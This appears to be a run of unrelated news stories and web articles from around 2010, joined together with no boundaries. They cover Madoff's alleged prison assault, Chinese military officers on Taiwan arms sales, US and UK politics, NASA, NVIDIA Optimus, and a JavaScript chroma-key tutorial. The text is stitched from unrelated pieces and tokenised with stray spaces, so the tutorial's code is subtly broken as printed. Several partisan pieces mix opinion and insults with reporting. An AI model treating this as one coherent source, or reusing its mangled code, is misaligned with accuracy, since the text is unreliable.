An inmate serving time in the same prison as Bernard Madoff allegedly fractured the convicted Ponzi schemer 's ribs and broke his nose in a reported December assault that prison officials at the time denied ever happened , according to the Wall Street Journal .
Authorities continue to deny that an assault took place against the 71 - year - old Madoff , who was moved Dec. 18 from his cell to a low - security medical center at the North Carolina prison where he is serving a 150 - year sentence for his $ 50 billion fraud .
Despite those denials , the WSJ reports today that three sources familiar with the situation told the paper that an attack did indeed occur against Madoff at the hands of another inmate .
At the time , initial reports indicated Madoff was assaulted , but prison officials dispelled rumors of an attack and said that Madoff suffered from dizziness and hypertension .
A current inmate at the Butler facility serving time on drug charges who the WSJ reports was " familiar with [ Madoff's ] condition at the time " told the paper that Madoff was treated for fractured ribs , facial and head lacerations and a broken nose .
However , the WSJ says , " the details of the injuries could n't be independently verified . "
A former felon also serving time at the prison on drug charges confirmed the assault to the WSJ and said the argument focused on money the alleged attacker reportedly believed Madoff owed him .
A third individual whom the WSJ described as close to the situation also confirmed the attack , but the paper disclosed no details about the source .
One of Madoff 's lawyers , Ira Sorkin , affirmed his client 's health problems as cited by the prison at the time , and did not comment on the allegations Madoff suffered a beating , telling the WSJ , " I do n't comment on prison conditions or his family .
That 's my policy . "
The Bureau of Prisons told the WSJ it investigated the alleged assault – a probe during which Madoff himself told officials he was not attacked .
" In December he told staff he was not assaulted , and an investigation was completed following his statements , which corroborated his statements , " Bureau of Prisons spokeswoman Traci Billingsley told the WSJ .
" Not one inmate has told staff he was assaulted . "
Asked specifically about the likelihood Madoff could have been attacked by an assailant described by a current inmate as " a beefy man serving time for a drug conviction , " Bilingsley told the WSJ it would be " virtually impossible " because that felon lived in a unit separate from Madoff and both units are locked down at night .

BEIJING ( Reuters ) - Senior Chinese military officers have proposed that their country boost defense spending , adjust PLA deployments , and possibly sell some U.S. bonds to punish Washington for its latest round of arms sales to Taiwan .
Members of the Chinese People 's Liberation Army ( PLA ) Air Force Aviation stand at attention during a training session at the 60th National Day Parade Village in the outskirts of Beijing , September 15 , 2009 .
REUTERS / Joe Chan
The calls for broad retaliation over the planned U.S. weapons sales to the disputed island came from officers at China ’s National Defence University and Academy of Military Sciences , interviewed by Outlook Weekly , a Chinese - language magazine published by the official Xinhua news agency .
The interviews with Major Generals Zhu Chenghu and Luo Yuan and Senior Colonel Ke Chunqiao appeared in the issue published on Monday .
The People ’s Liberation Army ( PLA ) plays no role in setting policy for China ’s foreign exchange holdings .
Officials in charge of that area have given no sign of any moves to sell U.S. Treasury bonds over the weapons sales , a move that could alarm markets and damage the value of China ’s own holdings .
While far from representing fixed government policy , the open demands for retaliation by the PLA officers underscored the domestic pressures on Beijing to deliver on its threats to punish the Obama administration over the arms sales .
“ Our retaliation should not be restricted to merely military matters , and we should adopt a strategic package of counter - punches covering politics , military affairs , diplomacy and economics to treat both the symptoms and root cause of this disease , ” said Luo Yuan , a researcher at the Academy of Military Sciences .
“ Just like two people rowing a boat , if the United States first throws the strokes into chaos , then so must we . ”
Luo said Beijing could “ attack by oblique means and stealthy feints ” to make its point in Washington .
“ For example , we could sanction them using economic means , such as dumping some U.S. government bonds , ” Luo said .
The warnings from the PLA come after weeks of strains between Washington and Beijing , who have also been at odds over Internet controls and hacking , trade and currency quarrels , and President Barack Obama ’s planned meeting with the Dalai Lama , the exiled Tibetan leader reviled by China as a “ separatist . ”
MILITARY SPENDING BOOST
Chinese has blasted the United States over the planned $ 6.4 billion arms package for Taiwan unveiled in late January , saying it will sanction U.S. firms that sell weapons to the self - ruled island that Beijing considers a breakaway province of China .
China is likely to unveil its official military budget for 2010 next month , when the Communist Party - controlled national parliament meets for its annual session .
The PLA officers suggested that budget should mirror China ’s ire toward Washington .
“ Clearly propose that due to the threat in the Taiwan Sea , we are increasing military spending , ” said Luo .
Last year , the government set the official military budget at 480.7 billion yuan ( $ 70.4 billion ) , a 14.9 percent rise on the one in 2008 , continuing a nearly unbroken succession of double - digit increases over more than two decades .
The fresh U.S. arms sales threatened Chinese military installations on the mainland coast facing Taiwan , and “ this gives us no choice but to increase defense spending and adjust ( military ) deployments , ” said Zhu Chenghu , a major general at China ’s National Defence University in Beijing .
In 2005 , Zhu stirred controversy by suggesting China could use nuclear weapons if the United States intervened militarily in a conflict over Taiwan .
The United States switched official recognition from Taiwan to China in 1979 .
But the Taiwan Relations Act , passed the same year , guarantees Taiwan a continued supply of defensive weapons .
China has the world ’s biggest pile of foreign currency reserves , much of it held in U.S. treasury debt .
China held $ 798.9 billion in U.S. Treasuries at end -October .
But any attempt to use that stake against Washington would probably maul the value of China ’s own dollar - denominated assets .
China has condemned previous arms sales , but has taken little action in response to them .
But Luo said the country ’s growing strength meant that time has passed .
“ China ’s attitude and actions over U.S. weapons sales to Taiwan will be increasingly tough , ” the magazine cited him as saying .
“ That is inevitable with rising national strength . ”
A grassroots US political grouping that has emerged in opposition to the conservative Tea Party movement has been holding its first national day of meetings .
The BBC's Madeleine Morris met some of the members of the Coffee Party in - where else ? - a coffee house in Washington .
Tea Party supporters want to cut government spending and influence Looking for a little bit of civil political discussion with your decaf latte ?
Well the newly formed Coffee Party movement may be for you .
Evolving in the United States over the last couple of months through social media in response to the conservative Tea Party movement , coffee partiers share the Tea Party 's disillusionment with mainstream politicians .
Internet traction Saturday saw over 350 Coffee Party events held in cafes across the United States and abroad , bringing activists together in person for the first time for a national day of conversation and , of course , espressos and cappuccinos .
We recognize that the federal government is not the enemy of the people , but the expression of our collective will
Coffee Party mission statement " If our children acted like our politicians are acting right now they would be grounded for a very long time , " says Ryan Clayton , a Coffee Party spokesperson in Washington DC .
Like the Tea Party , the Coffee Party is a movement , not a registered political entity .
But that is where the similarities end .
The Tea Party is a loose affiliation of activists from all over America who are distrustful of the federal government , and what they see as bloated government spending .
Over the past year Tea Party groups have held a number of loud , angry rallies across America denouncing President Barack Obama and other politicians .
The first national Tea Party convention in February featured former Alaskan governor Sarah Palin as its keynote speaker .
Unlike their Tea Party counterparts , who want a smaller government with less influence , coffee partiers believe government can provide solutions , and they want politicians to work together in a more civilised way .
" We need to get together as citizens and show them [ politicians ] that we can sit down and talk about these issues ; that we can solve problems and develop solutions ; that we may not agree on everything , but that we can agree on a lot , " says Mr Clayton .
Silent majority ?
Founder Annabel Park , who began the Coffee Party on her Facebook page out of anger at the Tea Party and its growing influence , has seen it rapidly gain traction on the internet .
Sarah Palin has become a favourite with many Tea Party supporters Its Facebook page has picked up over 138,000 fans in less than two months .
While the Tea Party can claim to have already helped win elections , including the vote for the new Massachusetts Senator , Scott Brown , can the Coffee Party gain the same sway on American politics ?
" We 're trying to approach politics differently so it 's hard to compare the level of influence , " says Annabel Park .
" Changing the political culture is not something you can measure by saying how many elections you 've won . "
But she maintains the coffee party represents the silent majority , who feel angry at politicians but do not want to voice their frustration by adopting the same aggressive and frequently negative tactics the Tea Party has .
" The two - party structure is just not working .
There are so many of us who feel these labels are outdated , that we 're much more complex and interconnected .
And people are coming to us exhilarated that there 's finally a place for them to have a voice , " she says .

AS GOVERNMENTS try to tackle huge structural budget deficits , one means of attack is to delay paying state pensions by gently raising the official state - retirement age .
Protests are expected in Spain on Tuesday February 23rd against an official plan to lift the retirement age by two years to 67 .
Official retirement ages have failed to keep pace with rising life expectancy , making pensions increasingly unaffordable .
In practice many people in the rich - world OECD countries retire several years early , which lets them enjoy , on average , some 19 years in retirement before death .
Spaniards should spare a thought for the previous generation ; those who became pensioners in 1970 could expect to survive for less than a decade .

By combining the capabilities of the video element with a canvas , you can manipulate video data in real time to incorporate a variety of visual effects to the video being displayed .
This tutorial demonstrates how to perform chroma- keying ( also known as the " green screen effect " ) using JavaScript code .
The document content
The HTML document used to render this content is shown below .
<! DOCTYPE html > < html > < head > < style > body { background : black ; color : #CCCCCC ; } #c2 { background - image : url( media / foo.png ) ; background - repeat : no -repeat ; } div { float : left ; border :1 px solid # 444444 ; padding : 10 px ; margin : 10 px ; background : #3B3B3B ; } </style > </head > < body > < div > < video id =" video " src=" media/video.mp4 " controls = " true " crossorigin= " anonymous " /> </div > < div > < canvas id = " c1 " width = " 160 " height = " 96 " ></ canvas > < canvas id = " c2 " width = " 160 " height = " 96 " ></ canvas > </div > < script type =" text/ javascript " src=" processor.js " ></ script > </ body > </html >
The key bits to take away from this are :
This document establishes two canvas elements , with the IDs c1 and c2 .
Canvas c1 is used to display the current frame of the original video , while c2 is used to display the video after performing the chroma - keying effect ; c2 is preloaded with the still image that will be used to replace the green background in the video .
The JavaScript code is imported from a script named processor.js .
The JavaScript code
The JavaScript code in processor.js consists of three methods .
Initializing the chroma - key player
The doLoad ( ) method is called when the XHTML document initially loads .
This method 's job is to prepare the variables needed by the chroma - key processing code , and to set up an event listener so we can detect when the user starts playing the video .
var processor ; processor.doLoad = function doLoad ( ) { this.video = document.getElementById(' video' ) ; this .c1 = document.getElementById('c1 ' ) ; this.ctx1 = this .c1.getContext ( ' 2d ' ) ; this.c2 = document.getElementById('c2 ' ) ; this.ctx2 = this.c2.getContext ( ' 2d ' ) ; let self = this ; this.video.addEventListener(' play ' , function ( ) { self .
width = self.video.videoWidth / 2 ; self.height = self.video.videoHeight / 2 ; self.timerCallback( ) ; } , false ) ; } ,
This code grabs references to the elements in the XHTML document that are of particular interest , namely the video element and the two canvas elements .
It also fetches references to the graphics contexts for each of the two canvases .
These will be used when we 're actually doing the chroma - keying effect .
Then addEventListener ( ) is called to begin watching the video element so that we obtain notification when the user presses the play button on the video .
In response to the user beginning playback , this code fetches the width and height of the video , halving each ( we will be halving the size of the video when we perform the chroma - keying effect ) , then calls the timerCallback ( ) method to start watching the video and computing the visual effect .
The timer callback
The timer callback is called initially when the video starts playing ( when the " play " event occurs ) , then takes responsibility for establishing itself to be called periodically in order to launch the keying effect for each frame .
processor.timerCallback = function timerCallback ( ) { if ( this.video.paused || this.video.ended ) { return ; } this.computeFrame ( ) ; let self = this ; setTimeout ( function ( ) { self.timerCallback( ) ; } , 0 ) ; } ,
The first thing the callback does is check to see if the video is even playing ; if it 's not , the callback returns immediately without doing anything .
Then it calls the computeFrame ( ) method , which performs the chroma - keying effect on the current video frame .
The last thing the callback does is call setTimeout ( ) to schedule itself to be called again as soon as possible .
In the real world , you would probably schedule this to be done based on knowledge of the video 's frame rate .
Manipulating the video frame data
The computeFrame ( ) method , shown below , is responsible for actually fetching a frame of data and performing the chroma - keying effect .
processor.computeFrame = function computeFrame ( ) { this.ctx1.drawImage( this.video , 0 , 0 , this .
width , this .height ) ; let frame = this.ctx1.getImageData(0 , 0 , this .
width , this .height ) ; let l = frame.data.length / 4 ; for ( let i = 0 ; i < l ; i++ ) { let r = frame.
data [ i * 4 + 0 ] ; let g = frame .
data [ i * 4 + 1 ] ; let b = frame.data [ i * 4 + 2 ] ; if ( g > 100 && r > 100 && b < 43 ) frame.data [ i * 4 + 3 ] = 0 ; } this.ctx2.putImageData( frame , 0 , 0 ) ; return ; }
When this routine is called , the video element is displaying the most recent frame of video data , which looks like this :
In line 2 , that frame of video is copied into the graphics context ctx1 of the first canvas , specifying as the height and width the values we previously saved to draw the frame at half size .
Note that you can simply pass the video element into the context 's drawImage ( ) method to draw the current video frame into the context .
The result is :
Line 3 fetches a copy of the raw graphics data for the current frame of video by calling the getImageData ( ) method on the first context .
This provides raw 32 - bit pixel image data we can then manipulate .
Line 4 computes the number of pixels in the image by dividing the total size of the frame 's image data by four .
The for loop that begins on line 6 scans through the frame 's pixels , pulling out the red , green , and blue values for each pixel , and compares the values against predetermined numbers that are used to detect the green screen that will be replaced with the still background image imported from foo.png .
Every pixel in the frame 's image data that is found that is within the parameters that are considered to be part of the green screen has its alpha value replaced with a zero , indicating that the pixel is entirely transparent .
As a result , the final image has the entire green screen area 100 % transparent , so that when it 's drawn into the destination context in line 13 , the result is an overlay onto the static backdrop .
The resulting image looks like this :
This is done repeatedly as the video plays , so that frame after frame is processed and displayed with the chroma - key effect .

Update : Newer WebGL based version
This is an old experiment .
I created a newer much faster webgl powered library for you to play with this technique .
It 's called normalmap.js .
It allows you to easily apply normal mapping for interactive lighting effects in javascript .
Original Article
I made a little experiment with normal mapping and phong shading in javascript which turned out to work quite well .
I think with a little bit of tweaking it could be used in a real time game .
Just move your mouse over the images bellow to see it in action .
You 'll need a modern browser supporting the canvas tag for this to work .
Google Chrome seems to be the fastest .
Demo
Source
You can view the source code here : light.js .
Feel free to copy from it , but please notify me if you use it for something cool . :)
Also beware that the code is pretty hacky and unpolished .
How it works
The 3D effect is basically created using 2 textures .
One contains the color of each pixel and the other the surface normal .
The color image is rendered using only indirect lighting ( ambient occlusion in that case ) .
The direct light is then calculated in real time using phong shading without the diffuse part .
For a more accurate description , read the source . ;)

I do n’t want to make light of any act of violence or threatened violence against a public official , but there was something about Minority Whip Eric Cantor ’s claim this morning that his campaign office in downtown Richmond had been shot at that seemed off .
First , there were no local news reports of the incident , which he said happened this week .
Second , the first news report of any kind about the incident seems to have been a Foxnews.com “ exclusive ” published just before Cantor spoke .
Third , the timing of Cantor ’s revelation seemed curious given what a plastering Republicans have been getting over the last 24 hours for their role in inciting isolated acts of vandalism and threats against Democrats .
As I say , this is not the sort of thing to be taken lightly or mocked , but take a look at the press release we just got in from the Richmond Police Department about this incident ( the italics are mine ) :
The Richmond Police Department is investigating an act of vandalism at the Reagan Building , 25 E. Main St. , Richmond , Virginia .
A first floor window was struck by a bullet at approximately 1 a.m. on Tuesday , March 23 .
The building , which has several tenants including an office used by Congressman Eric Cantor , was unoccupied at the time .
A Richmond Police detective was assigned to the case .
A preliminary investigation shows that a bullet was fired into the air and struck the window in a downward direction , landing on the floor about a foot from the window .
The round struck with enough force to break the windowpane but did not penetrate the window blinds .
There was no other damage to the room , which is used occasionally for meetings by the congressman .
We ’ve posted the police incident report here .
So the police have determined that someone fired a shot into the air in downtown Richmond that came down and struck the window of a first floor office in the same building Cantor has a campaign office .
To emphasize , unless someone was trying to hit Cantor ’s office with a bank shot off a cloud , neither Cantor nor the building were the target of this bullet .
The bullet did break the window and set off the building ’s alarm system but was n’t able to make it past the blinds .
The police say Cantor sometimes uses the room where the bullet was found .
We know that Cantor has used a first floor conference room in the small building for meetings in the past .
We also know that Republican campaigns and campaign consultants , including Bolling For Lt Governorâ , Cantor for Congressâ , Creative Direct LLCâ , LaCivita Consulting LLCâ and Marcus & Allen LLCâ , also work from that building .
Now look , if I found a bullet on the floor in my office , I ’d be alarmed , too .
But I ’m pretty sure , given what the police determined , that I would not go on national TV and say , as Cantor did : “ Just recently , I have been directly threatened .
A bullet was shot through the window of my campaign office in Richmond this week . ”
That strikes me as a much more alarming sounding phrasing than what police say actually happened , especially since Cantor ’s point was to equate his case with the threats and vandalism against Democratic lawmakers .
Am I being uncharitable here ?
I should also note that Cantor says he ’s gotten other threats , separate and apart from this incident .
Glenn Beck has had plenty of apocalypticism on his show since he came to Fox -- we all remember the famous " War Room " episode in which guest Gerald Celente plotted out a future in which drug - running motorcycle gangs ran our cities .
That was probably the topper .
But yesterday he came pretty close .
His entire hourlong show featured a conversation with two guests : Damon Vickers of Nine Points Investment Capital , and Brian Doherty of Reason magazine .
It was all about how the government is driving the nation into a " debt implosion " that will be the End of the World As We Know It .
That is , after all , what apocalypses are about , right ?
At the end of the hour , Beck asked them to describe what advice they 'd give to ordinary people to help prepare for this apocalypse .
Doherty was thoughtful and reasonable .
Then came Vickers :
Vickers :
The other side of a debt implosion , which is what we 're in the process of realizing right now , is potentially even anarchy .
Anarchy in a society .
And so individuals and families have to have the foresight -- that 's situational awareness -- to perhaps consider , maybe , maybe having a farm , maybe growing your own food , maybe you need to take up arms if you have any to protect your family .
The period that 's emerging in front of us could be very , very scary -- Beck :
He 's spookier than I am !
Unsurprisingly , Vickers has previously helped stoke Beck 's paranoia , in fact inspiring him to announce that Obama is taking us straight to a New World Order global government .
Vickers inspired the rant by appearing on CNBC speculating that the ultimate solution to the economy would be " global government " .
Vickers is a longtime nutcase who in fact was coming fresh off the Alex Jones show earlier this week , expounding on this same theory .
If you 're worried about Vickers ' powers of prognostication , take note : A year ago , Vickers predicted Microsoft was " going nowhere but down . "
That was when its stock price was at 13 .
Now it 's above 30 .
David Cameron is due to give his keynote speech on Sunday The Conservatives will contest the general election on six themes , the party has announced at its spring conference in Brighton .
They cover the national debt , the economy , family , the NHS , schools and changes in Westminster .
David Cameron dismissed criticism that the Tories were too " timid " in a video post on his WebCameron blog , saying their plans were " bold and radical " .
Labour 's Douglas Alexander said the proposals were " reckless " .
The Tories have revealed their election slogan will be " Vote for change " .
' Difficult truths '
In his blog , Mr Cameron , said : " The Conservative Party is a modern party and it's a bold , radical party - and that 's the way it 's going to stay . "
Mr Brown may not want to discuss his pension - destroying , gold - selling , golden - rule - breaking , national debt - doubling , money - wasting , tax - raising , colleague - rubbishing , pledge - betraying , election - bottling record , but we do
William Hague Shadow foreign secretary
Have your say
He said Gordon Brown was taking the country in the " wrong direction " and Britain was " crying out " for the Conservative Party to bring " [ their ] values , ideas and energy " and make " big changes " .
" I defy anyone to look at our plans and call them timid - because the truth is they cannot be timid if we 're to confront and defeat these problems , " he said .
Shadow chancellor George Osborne told the conference he wanted to create the " solid economic foundations of a Britain that works for all " .
He said : " Our country stands at one of those forks we come across as we travel the roads of our history , " adding that the public had to make a choice .
" Britain can either continue down a path of decline and fall , a path with rising debts , higher mortgage rates , ever rising taxes and high unemployment .
CONSERVATIVE ELECTION THEMES
Act now on debt to get the economy moving Get Britain working by boosting enterprise Make Britain the most family - friendly country in Europe Back the NHS Raise standards in schools Change politics " That is Labour 's path .
It always has been .
We know where it leads and we must never allow this country to be dragged there once again .
" Or we can change direction - tell the difficult truths , put debt and taxes back on a downwards trajectory , and create the solid economic foundations of a Britain that works for all .
That is the Conservative path . "
Opening the conference , shadow foreign secretary William Hague railed against the Prime Minister , saying Gordon Brown would have to be " dragged kicking and screaming " into the coming general election .
" He may not want to discuss his pension - destroying , gold - selling , golden - rule - breaking , national debt - doubling , money - wasting , tax - raising , colleague - rubbishing , pledge - betraying , election - bottling record , but we do - you can be sure of that , " he said .
' Little new ' Labour are using the Conservative conference , which coincides with a Welsh Labour Party conference in Swansea , as an opportunity to launch a new poster attacking Mr Osborne .
From George Osborne 's reckless economic plans to their proposals to scrap our cancer guarantees and remove vital support from families , the Tories ' proposals would hit millions of people across Britain hard
Douglas Alexander Labour 's election co-ordinator
Brown attacks
Tory cuts proposals
The election must be held by June but is expected to take place on 6 May .
Recent polls have suggested the Conservative lead over Labour may be narrowing .
Mr Alexander , who is Labour 's election co-ordinator , criticised Conservative plans , saying they offered the " wrong kind of change " - and one people " really can't afford " .
" From George Osborne 's reckless economic plans to their proposals to scrap our cancer guarantees and remove vital support from families , the Tories ' proposals would hit millions of people across Britain hard , " he said .
BBC political correspondent Carole Walker said Conservatives that had been concerned about a " slide in the polls and recent slip - ups " were hoping a " sharper message " would help them " take the attack to their political opponents " .
Mr Cameron would be hoping to recreate the " mood of excitement and momentum he created when he became party leader " , she said .
His speech is likely to set out the extent of the economic challenges facing the next government .
Revised figures published on Friday confirmed that the UK did emerge from recession slightly stronger than initially thought but all parties agree the recovery is still fragile .
For people who want real change , real fairness in Britain there is only one choice : the Liberal Democrats
Danny Alexander MP
Liberal Democrats
The Conservatives also unveiled Professor David Kerr , a leading cancer specialist , as the party 's new health adviser .
Prof Kerr was once a prominent supporter of Tony Blair and Labour 's health reforms but said on Friday that he believed the Tories were now best placed to take the NHS forward .
The Tory conference comes a week after the prime minister revealed Labour 's election slogan of " a future fair for all " .
Labour is also releasing an image of Mr Osborne , accompanied by the slogan " Chancer not Chancellor " .
The Liberal Democrats say only they offer a change to the existing way of conducting politics .
Danny Alexander , the Liberal Democrat leader 's chief of staff , said : " It 's between the old way of doing politics and the real change represented by the Liberal Democrats " .

President Obama will travel to Florida to unveil an “ ambitious plan for NASA that sets the agency on a reinvigorated path of space exploration , ” according to a press release from the White House .
The President will host a conference on April 15 , inviting space officials and leaders to discuss the new budget and plan for NASA and the future of U.S. leadership in human space flight .
The location was not yet disclosed , but it likely will be at Kennedy Space Center .
Specifically , the conference will focus on the goals and strategies , the next steps , and the new technologies , new jobs , and new industries it will create , the White House said .
Conference topics will include the implications of the new strategy for Florida , the nation , and our ultimate activities in space .
The proposed plan for NASA , which includes cutting the Constellation program to return to the Moon , has drawn extreme reactions — both praise and harsh criticism since first announced on Feb.
1 , 2010 .
Most agreed , however , that the plan was short on details as to destinations and how we might get there .
After the Augustine Commission found that Constellation program was “ fundamentally un-executable , ” Obama ’s new plan cancels the Ares rockets but add $ 6 billion for NASA over the next five years .
“ This funding will help us achieve our boldest aspirations in space , ” the White House said in the press release .
“ The President ’s ambitious new strategy pushes the frontiers of innovation to set NASA on a more dynamic , flexible , and sustainable trajectory that can propel us on a new journey of innovation and discovery . ”
But former astronaut Leroy Chiao , a member of the Augustine Commission said he was surprised Constellation was cut .
“ I did n’t foresee the recent announcement of the cancellation of the NASA Orion crew exploration vehicle ( CEV ) , ” Chiao wrote in his blog , “ the commercial option was for LEO access , not exploration .
I expected that CEV , along with either a heavy lift vehicle , or a man-rated expendable launcher would serve as a complimentary system to commercial LEO efforts .
Details of the US plans for the future of NASA human spaceflight remain to be revealed , but I remain cautiously optimistic .
Sometimes it takes dramatic change , even temporary chaos , to affect the possibility of a quantum jump in improvement . ”
There ’s been much discussion about if this new “ plan ” means the end of human spaceflight as we know it .
It might .
But do we want to keep going with the status quo , or go in new directions ?
Hopefully the April 15 conference will provide the details everyone is craving .
Change is hard , and certainly , not everyone will be satisfied .
Now , we just need to wait … .
Dec. 2 marks the fifth anniversary of Ohio ’s Defense of Marriage Act .
In 2004 , Ohio passed a constitutional amendment banning same - sex marriage .
In honor of the banniversary , Equality Ohio has created a video to be delivered to members of the Ohio legislature .
It is a part of the organization ’s Our Stories project , which seeks to share the real stories of LGBT Ohioans to lawmakers and other citizens .
Warning :
It ’s a tearjerker .
Obama promises to pursue a public option later
Raul Grivalja , co-chair of the Progressive Caucus , made some waves the other day by suggesting he was leaning against voting for the health - care reform bill .
I 've stopped covering daily statements like that one , as it's too difficult to figure out whether they mean " I do n't want to vote for this bill " or " I want something in exchange for voting for this bill . "
A statement just released by the Grivalja press office makes this look like a case of the latter :
“ The meeting with President Obama today was productive and necessary , and I was glad to hear him speak frankly about where we stand on health care legislation .
He said the public option – a well - known and long - standing progressive priority – lacks enough Senate support to be included in the final package .
However , he personally committed to pursue a public option after passage of the current bill .
I remain concerned about elements of the bill , but was encouraged by the president ’s outreach and interest in a substantive discussion .
We agree that expanding health care access and quality , while bringing down costs , is a top priority this year , and I intend to continue playing a constructive role until Congress holds its final vote . ”
I 've long wondered why Obama did n't promise this a while ago .
A bill offering a public option and Medicare buy - in to age 55 would be a popular bill , and a good bill , and could be done after health - care reform had passed .
The administration and others like to say that the Senate legislation is just a start , and they should begin acting on that belief .
Pass the start , and then begin trying to make it better with smaller , discrete bills that are easier to message and pass .
On the browser as an application platform
It 's very positive .
What Google calls HTML5 is really a lot of other standards .
There 's SVG , for example .
Opera Mini :
Coming to an iPhone near you ?
What happened was that people were using the web browser for application when it was n't really built to be one .
In the very early days the web browser was a document viewer , there was no scripting .
Then people added plug -ins very early on .
Then came scripting .
Now web browsers are being built better for applications .
For cross-platform development what other choices do you have ?
You can write code natively but that 's a lot of platforms , especially on mobile devices .
That 's why getting browsers to do standards is really important .
On Google doing the right thing
We compete and we cooperate .
We go on every platform we can .
Google makes services and I think they understand that fragmentation is a significant problem .
Yes , they have their own verticals with Android , but what they call HTML5 is an attempt to create a common platform for their services .
On the iPhone app
We have not yet submitted Opera Mini to the Apple App Store .
It runs now - it's not the finished article , but it works beautifully .
It 's a native app written in C .
I think it will be accepted .
Why should n't it be ?
We 're not running any applications within Opera Mini , and it is a great experience for iPhone users , it 's a great choice to have .
It saves 90 per cent on roaming costs , it 's six times faster than Safari on the iPhone .
Opera Mini renders information from our servers .
We start with all the sessions loaded , it 's very fast .
You really feel the difference on mobile networks .
If you 're only using your iPhone at WiFi hotspots , then what 's the point of browsing on a phone ?
On Opera innovation , the web everywhere
We 're always been ahead of the curve .
Ten years ago , we said we wanted the full web everywhere , and lots of people disagreed , they wanted a mobile web for mobile devices .
Now people can see we were right .
We 're already seeing Philips TVs with Opera built in .
That 's where Unite comes in , we think P2P is the next stage of the web everywhere .
Today a photo you take on your phone [ waves E71 ] stays on your phone .
But if each phone had an IP address , and then people could connect to you and see it .
That 's why we think you 'll have Unite everywhere .
We want to bring home the message that the web will be everywhere , in your mobile , in your GPS , in your set top box .
Google 's Latitude knows where you are
On Location
Location will be huge but it 's early days .
Some of the examples are , as you say , creepy .
But it 's like the early days of telephony - I was at Telenor when it was a pioneer in video telephony in the early 1990s .
Telenor realised you need controls for people to turn it off - they want a shutter over the camera .
They do n't like that " coming out of the shower " moment .
It 's too much information .
Google showed an example at Zeitgeist of its Latitude location service that was creepy .
They showed an engineer on vacation for a week in Mexico , and they could see he had n't left his hotel for a week .
They were joking about it .
That too is too much information .
But a few people will want it , so let them have it . ®
Launched earlier this month , NVIDIA 's Optimus is a clever solution that could , and probably will , completely turn around NVIDIA 's fortunes in the mobile space .
It 's also extremely likely that , as a new rumor suggests , the technology will make an appearance in the next revision of Apple 's MacBook line of portables .
In a nutshell , Optimus allows seamless , invisible switching between Intel 's still - anemic integrated graphics processors ( IGPs ) and NVIDIA 's popular discrete mobile GPUs .
On an application - by - application basis , the NVIDIA graphics driver decides if the app can benefit from GPU acceleration and , if it can , it hands off the rendering work to an NVIDIA GPU that sits on the PCIe bus .
This behind - the - scenes handoff happens without any user intervention , and without so much as a flicker on the display .
It 's likely — actually , I would say it 's certain — that Apple will adopt Optimus across its MacBook line as it updates the portables to include the latest round of Intel mobile processors , which feature an IGP and northbridge chipset in the same package as the CPU .
Apple 's alternative would be to ditch Intel and go with an AMD / ATI platform ; this is beyond unlikely .
Optimus basics
Optimus is basically NVIDIA 's answer to the Intel bus licensing dispute , in which Intel torpedoed NVIDIA 's IGP business by refusing to grant the company a license to the DMI bus that connects
Intel 's newest mobile processor / GPU combo chips to the I/O hub that had formerly hosted the IGP ( before the IGP made the move into the CPU package ) .
If NVIDIA had been granted a DMI bus license , the company could have made its own I/O hub containing an IGP and some I/O controller hardware , but Intel did n't , so NVIDIA could n't .
Enter Optimus , which is an engineering - driven end - run around Intel 's new IGP monopoly .
Instead of replacing an Intel I/O hub and IGP combo chip with an NVIDIA part , NVIDIA just hangs its discrete GPU off of the Intel I/O hub via a x16 PCIe lane .
The PCIe bus provides plenty of bidirectional bandwidth , and given that Optimus sends data to and from the main CPU socket , it needs bandwidth to work at higher resolutions .
When the system is using NVIDIA 's discrete GPU , the IGP is being used only as a simple display controller that reads in data from the frame buffer and sends it to the system display port .
All of the graphical heavy lifting is being done by the NVIDIA GPU , which takes in data from the CPU , does its rendering and processing , and then sends the results back to the CPU socket and to the frame buffer .
Optimus works by taking advantage of a feature of Intel 's IGP that has been the source of much enthusiast griping over the years : the fact that Intel IGPs store the frame buffer in system memory , instead of in a dedicated pool of fast memory like NVIDIA 's and ATI 's IGPs .
Intel used system memory to keep platform costs down ( the extra memory chips that competitors ' IGPs used boosted the price ) , but at the cost of some system performance — not having dedicated memory slows down 3D rendering , and it also reduces the amount of system memory available to other applications .
The software side of the Optimus platform inserts itself between the OS / app stack and the graphics hardware , and it accesses system memory to fill the frame buffer itself .
Intel 's IGP still reads from the frame buffer to do display output , but it 's just reading and displaying frames that were generated by NVIDIA 's GPU and sent to main memory .
Optimus decides which applications need the discrete GPU 's help by using application - specific profiles that it gets over the Internet from an NVIDIA - hosted server .
These profiles are sort of like cheat - sheets that tell the Optimus how it can best work with the IGP to help particular applications and games .
In the final reckoning , Optimus actually makes Intel 's IGPs more competitive with AMD / ATI platforms by offering a way to boost its graphics performance , so Optimus is actually a net positive for Intel .
Contrast this to NVIDIA 's previous IGP business , which competed with Intel IGPs .
But Intel has no presence in the discrete mobile GPU market , and with the Larrabee program now on ice , it wo n't have a competing product for some time .
Optimus , then , fills a gap in Intel 's platform that desperately needs to be filled , which is why Apple is certain to announce that it will be powering the MacBook line eventually .
Postscript : what about AMD / ATI ?
ATI 's answer to coexisting with Intel is switchable graphics , where users can manually switch between Intel 's IGP and ATI 's discrete GPU .
This requires user intervention and a logout , so that the display can be handed off from one GPU to the other .
And if you switch over to the discrete GPU and then move your laptop from wall power to battery power without first switching back to the IGP , you could drain your battery accidentally .
For this and other , more technical reasons , switchable graphics is not the answer , and ATI will have to match Optimus 's features , performance , and low cost if it wants anyone to consider Radeon as a GPU for Intel mobile platforms .

By speaking to Muslim countries , the president gives support to those who do n’t believe the official account of 9/11 , says former Massachusetts Governor Mitt Romney .
“ I saw even Ahmadinejad is now saying 9/11 is a fabrication , ” Romney told Fox News ’ Chris Wallace .
“ These sorts of voices should not receive any kind of support from the words of the president of the United States . ”

On what critics are calling a “ foreign policy mythology ” book tour , Romney is repeatedly spinning several falsehoods about Iran , Iraq and Afghanistan .
In Romney ’s new book “ No Apology : The Case for American Greatness ” he writes : “ President Obama has positioned himself as a figure transcending America instead of defending America …
What makes his speeches jump out at his audience are the steady stream of criticisms , put - downs , and jabs directed at the nation he was elected to represent and defend . ”
Romney says he ’s glad the Patriot Act was extended , but Obama ’s “ Apology Tour ” was a mistake .
Wallace did not ask Romney about his tan .

Warner Bros. has attached Guy Ritchie to direct and Trainspotting scribe John Hodge to develop a King Arthur project for Atlas Entertainment and Hollywood Gang , according to Variety .
Hodge is working on the script with Ritchie .
The project aims to be a re-imagining of the legend of Arthur , believed to have been a 6th century king who defended Britain against Saxon invaders .
Key source material will be Thomas Mallory 's " Le Morte d'Arthur , " published in 1485 as a compilation of French and English tales .

